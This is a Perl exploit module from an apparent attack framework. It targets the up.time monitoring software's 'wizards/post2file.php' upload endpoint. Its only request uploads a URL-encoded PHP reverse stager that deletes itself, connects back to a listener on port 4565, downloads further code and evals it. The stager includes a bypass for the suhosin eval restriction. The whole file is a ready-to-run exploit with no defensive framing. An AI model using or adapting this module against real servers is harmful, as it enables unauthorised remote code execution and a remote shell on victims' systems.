package MSFPerlExploits::UPTIME::MSF::FileUpload_1;
use parent qw(P1rK3r::Exploit P1rK3r::Services::UPTIME);use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "FileUpload_1";

   my $DETECTION = {

   };

   my $EXPLOIT = {

        NAME => 'FileUpload_1',
        TYPE => 'MSF',
        PLATFORM => 'MULTI',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'wizards/post2file.php',
                        PAYLOAD      => 'file_name=OFOtg.php&script=%3c%3fphp%20%40unlink%28__FILE__%29%3b/%2a%3c%3fphp%20/%2a%2a/%20error_reporting%280%29%3b%20%24ip%20%3d%20%27127.0.0.1%27%3b%20%24port%20%3d%204565%3b%20if%20%28%28%24f%20%3d%20%27stream_socket_client%27%29%20%26%26%20is_callable%28%24f%29%29%20%7b%20%24s%20%3d%20%24f%28%22tcp%3a//%7b%24ip%7d%3a%7b%24port%7d%22%29%3b%20%24s_type%20%3d%20%27stream%27%3b%20%7d%20if%20%28%21%24s%20%26%26%20%28%24f%20%3d%20%27fsockopen%27%29%20%26%26%20is_callable%28%24f%29%29%20%7b%20%24s%20%3d%20%24f%28%24ip%2c%20%24port%29%3b%20%24s_type%20%3d%20%27stream%27%3b%20%7d%20if%20%28%21%24s%20%26%26%20%28%24f%20%3d%20%27socket_create%27%29%20%26%26%20is_callable%28%24f%29%29%20%7b%20%24s%20%3d%20%24f%28AF_INET%2c%20SOCK_STREAM%2c%20SOL_TCP%29%3b%20%24res%20%3d%20%40socket_connect%28%24s%2c%20%24ip%2c%20%24port%29%3b%20if%20%28%21%24res%29%20%7b%20die%28%29%3b%20%7d%20%24s_type%20%3d%20%27socket%27%3b%20%7d%20if%20%28%21%24s_type%29%20%7b%20die%28%27no%20socket%20funcs%27%29%3b%20%7d%20if%20%28%21%24s%29%20%7b%20die%28%27no%20socket%27%29%3b%20%7d%20switch%20%28%24s_type%29%20%7b%20case%20%27stream%27%3a%20%24len%20%3d%20fread%28%24s%2c%204%29%3b%20break%3b%20case%20%27socket%27%3a%20%24len%20%3d%20socket_read%28%24s%2c%204%29%3b%20break%3b%20%7d%20if%20%28%21%24len%29%20%7b%20die%28%29%3b%20%7d%20%24a%20%3d%20unpack%28%22Nlen%22%2c%20%24len%29%3b%20%24len%20%3d%20%24a%5b%27len%27%5d%3b%20%24b%20%3d%20%27%27%3b%20while%20%28strlen%28%24b%29%20%3c%20%24len%29%20%7b%20switch%20%28%24s_type%29%20%7b%20case%20%27stream%27%3a%20%24b%20.%3d%20fread%28%24s%2c%20%24len-strlen%28%24b%29%29%3b%20break%3b%20case%20%27socket%27%3a%20%24b%20.%3d%20socket_read%28%24s%2c%20%24len-strlen%28%24b%29%29%3b%20break%3b%20%7d%20%7d%20%24GLOBALS%5b%27msgsock%27%5d%20%3d%20%24s%3b%20%24GLOBALS%5b%27msgsock_type%27%5d%20%3d%20%24s_type%3b%20if%20%28extension_loaded%28%27suhosin%27%29%20%26%26%20ini_get%28%27suhosin.executor.disable_eval%27%29%29%20%7b%20%24suhosin_bypass%3dcreate_function%28%27%27%2c%20%24b%29%3b%20%24suhosin_bypass%28%29%3b%20%7d%20else%20%7b%20eval%28%24b%29%3b%20%7d%20die%28%29%3b%20%3f%3e',
                        TEXT         => 'Sending First Exploit Request On : /wizards/post2file.php',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;